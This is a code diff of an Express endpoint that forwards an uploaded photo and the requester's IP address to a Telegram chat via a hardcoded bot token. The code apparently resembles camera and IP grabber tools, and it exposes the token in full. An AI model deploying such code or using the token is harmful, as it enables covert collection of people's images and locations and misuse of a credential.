@@ -36,32 +36,39 @@ app.post('/telebot', upload.single('photo'), (req, res) => {
     const token = '7846389597:AAHfE-4zLRONag3dRsWsI2RpXW9T_-Y6uwA';
     const ipAddress = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
 
+    const formData = new FormData();
+    formData.append('chat_id', userId);
+
     if (req.file) {
-        const formData = new FormData();
-        formData.append('chat_id', userId);
-        formData.append('caption', `User IP: ${ipAddress}`);
         const fileExtension = req.file.mimetype.split('/')[1];
         const filename = `photo.${fileExtension}`;
         formData.append('photo', req.file.buffer, { filename });
-
+        formData.append('caption', `User IP: ${ipAddress}`);
+        
         axios.post(`https://api.telegram.org/bot${token}/sendPhoto`, formData, {
             headers: formData.getHeaders(),
         })
         .then(() => {
+            console.log('Photo and IP sent successfully.');
             res.sendStatus(200);
         })
-        .catch(() => {
+        .catch(err => {
+            console.error('Error sending photo:', err.response ? err.response.data : err.message);
             res.sendStatus(500);
         });
     } else {
+        const text = `User IP: ${ipAddress}`;
+
         axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
             chat_id: userId,
-            text: `User IP: ${ipAddress}`,
+            text: text,
         })
         .then(() => {
+            console.log('IP sent successfully.');
             res.sendStatus(200);
         })
-        .catch(() => {
+        .catch(err => {
+            console.error('Error sending IP:', err.response ? err.response.data : err.message);
             res.sendStatus(500);
         });
     }
